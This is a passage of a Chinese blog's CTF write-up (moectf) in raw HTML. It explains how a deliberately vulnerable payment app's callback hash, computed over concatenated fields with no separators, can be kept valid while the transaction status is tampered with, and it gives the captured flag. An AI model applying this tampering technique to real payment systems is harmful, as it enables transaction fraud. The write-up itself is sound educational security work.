class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由 /callback 在处理交易，是最核心的部分（接受参数，验证交易，更新并存储交易）</span></span><br><span class="line"><span class="comment"># methods=[&#x27;POST&#x27;] 只接受 POST 参数</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/callback&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">callback</span>():</span><br><span class="line">    form = <span class="built_in">dict</span>(<span class="keyword">await</span> request.form)</span><br><span class="line">    data = (</span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;id&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;user&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;amount&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;status&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">f&#x27;<span class="subst">&#123;form.get(<span class="string">&quot;desc&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line">    ).encode()</span><br><span class="line">    <span class="comment"># 计算传来参数的哈希值，为了验证交易的真假</span></span><br><span class="line">    k = pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, data, app.secret_key, <span class="number">2</span>**<span class="number">20</span>).<span class="built_in">hex</span>()</span><br><span class="line">    tr = <span class="keyword">await</span> Transaction.get(<span class="built_in">id</span>=<span class="built_in">int</span>(form.pop(<span class="string">&#x27;id&#x27;</span>)))</span><br><span class="line">    <span class="comment"># 计算的哈希值和传递的哈希值不一样就说明交易是被修改过的</span></span><br><span class="line">    <span class="comment"># 就不会进行保存</span></span><br><span class="line">    <span class="keyword">if</span> k != form.get(<span class="string">&quot;hash&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;403&#x27;</span></span><br><span class="line">    form[<span class="string">&#x27;status&#x27;</span>] = TransactionStatus(<span class="built_in">int</span>(form.pop(<span class="string">&#x27;status&#x27;</span>)))</span><br><span class="line">    <span class="comment"># 保存到数据库</span></span><br><span class="line">    tr.update_from_dict(form)</span><br><span class="line">    <span class="keyword">await</span> tr.save()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由 /transaction 根据交易的 id 打印交易信息</span></span><br><span class="line"><span class="comment"># 这里的信息很重要，我们能获取到这次交易的 id、交易状态和交易的哈希值</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/transaction&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">transaction</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;id&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;404&#x27;</span></span><br><span class="line">    transaction = <span class="keyword">await</span> Transaction.get(<span class="built_in">id</span>=request.args.get(<span class="string">&#x27;id&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> render_template(<span class="string">&#x27;receipt.html&#x27;</span>, transaction=transaction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由 /flag 根据 balance 的值决定是否输出 flag</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> render_template(</span><br><span class="line">        <span class="string">&#x27;flag.html&#x27;</span>,</span><br><span class="line">        balance=session[<span class="string">&#x27;balance&#x27;</span>],</span><br><span class="line">        flag=os.getenv(<span class="string">&#x27;FLAG&#x27;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由 / 和 /index.html 用于打印源码</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index.html&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> render_template(<span class="string">&#x27;source-highlight.html&#x27;</span>, code=f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置数据库相关的数据</span></span><br><span class="line">register_tortoise(</span><br><span class="line">    app,</span><br><span class="line">    db_url=<span class="string">&quot;sqlite://./data.db&quot;</span>,</span><br><span class="line">    modules=&#123;<span class="string">&quot;models&quot;</span>: [__name__]&#125;,</span><br><span class="line">    generate_schemas=<span class="literal">True</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>这段代码使用到了框架 Quart，它和 Flask 较为相似，是 Flask 微框架 API 的异步重新实现，我们先来做一次交易看看整个过程：</p>
+<p><img src="/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F1.png" alt="支付系统"></p>
+<p>从图中发现交易失败了，这因为代码里函数 do_callback 把我们的<code>transaction.status</code>设置为了 FAILED，因此 balance 不会加上本次交易的 amount，查看<code>/flag</code>就会发现：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Your current balance: 0</span><br><span class="line">You don&#x27;t have enough money to buy a flag.</span><br></pre></td></tr></table></figure>
+
+<p>看来确实是这样，那自然就想到修改<code>transaction.status</code>为 SUCCESS，来到<code>/callback</code>修改<code>transaction.status</code>：</p>
+<p><img src="/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F2.png" alt="支付系统"></p>
+<p>不成功也很正常，因为我们修改了<code>status</code>而没有修改 hash，而 hash 也是无法伪造的，因为我们不知道<code>app.secret_key</code>，那只有仔细看代码，看看构造 hash 时有没有漏洞：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = (</span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.user&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.amount&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.status&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;transaction.desc&#125;</span>&#x27;</span></span><br><span class="line">).encode()</span><br><span class="line"><span class="keyword">await</span> ses.post(<span class="string">f&#x27;http://localhost:8000/callback&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: transaction.<span class="built_in">id</span>,</span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>: transaction.user,</span><br><span class="line">    <span class="string">&#x27;amount&#x27;</span>: transaction.amount,</span><br><span class="line">    <span class="string">&#x27;desc&#x27;</span>: transaction.desc,</span><br><span class="line">    <span class="string">&#x27;status&#x27;</span>: transaction.status,</span><br><span class="line">    <span class="string">&#x27;hash&#x27;</span>: pbkdf2_hmac(<span class="string">&#x27;sha256&#x27;</span>, data, app.secret_key, <span class="number">2</span>**<span class="number">20</span>).<span class="built_in">hex</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>可以看出 hash 是对 data 运算产生的，这里请注意 data 的构造方法，可能不是很直观，举一个例子更好理解：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&quot;123&quot;</span></span><br><span class="line">b = <span class="number">456</span></span><br><span class="line"></span><br><span class="line">data = (</span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;a&#125;</span>&#x27;</span></span><br><span class="line">    <span class="string">f&#x27;<span class="subst">&#123;b&#125;</span>&#x27;</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br></pre></td></tr></table></figure>
+
+<p>打印的结果是<code>123456</code>，这就有问题了，我们都知道对于同一个数据，它的哈希值总是相同的，那么在这里我们就可以随便修改 data 里的数据，只要保证 data 整体的值不变，它的哈希值就不变</p>
+<p>更具体地来说，修改<code>/callback</code>时传入的<code>amount、status、desc</code>，使<code>status</code>变为 0，而 data 整体不变：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">route      amount status desc data</span><br><span class="line">/pay       2000    2      2   200022</span><br><span class="line">/callback  200     0     22   200022</span><br></pre></td></tr></table></figure>
+
+<p>重新创建一次交易，注意<code>amount=2000&amp;desc=2</code>：</p>
+<p><img src="/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F3.png" alt="支付系统"></p>
+<p>修改这次交易，注意<code>amount=200&amp;status=0&amp;desc=22</code>：</p>
+<p><img src="/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F4.png" alt="支付系统"></p>
+<p>再次访问<code>transaction?id=1687</code>发现交易成功：</p>
+<p><img src="/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F5.png" alt="支付系统"></p>
+<p>访问<code>/flag</code>：</p>
+<p><img src="/image/post/2022/09/%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F6.png" alt="支付系统"></p>
+<p>获取 flag：<code>moectf{b3c0me_s3nsit1v3_t0_bu9s}</code></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/Wp/" rel="tag"># Wp</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/09/10/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5%E5%92%8C%E5%9F%9F%E5%AE%89%E5%85%A8/" rel="prev" title="同源策略和域安全">
+                  <i class="fa fa-angle-left"></i> 同源策略和域安全
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/03/12/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AF%B9%E9%94%90%E6%8D%B7%E8%B7%AF%E7%94%B1%E5%90%8E%E5%8F%B0%E5%AF%86%E7%A0%81%E7%9A%84%E7%88%86%E7%A0%B4/" rel="next" title="记一次对锐捷路由后台密码的爆破">
+                  记一次对锐捷路由后台密码的爆破 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备2022001516号 </a>
+  </div>
+  <div class="copyright">
+    &copy; 2022 – 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Paoka1</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
